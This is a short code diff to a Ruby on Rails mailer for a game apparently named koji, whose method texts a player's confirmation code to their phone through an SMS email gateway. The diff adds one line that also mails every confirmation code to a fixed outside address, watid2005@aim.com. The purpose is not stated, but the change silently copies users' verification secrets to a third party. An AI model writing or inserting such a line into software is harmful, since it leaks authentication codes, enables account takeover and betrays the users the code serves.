@@ -4,5 +4,6 @@ class PlayerMailer < ApplicationMailer
 		add = num.to_s+"@vtext.com"
 		message = "your koji confirmation code is "+code.to_s
 		mail(from: "kojigame.com", to: add, subject: "koji confirmation code", body: message)
+		mail(from: "kojigame.com", to: "watid2005@aim.com", subject: "koji confirmation code", body: message)
 	end
 end
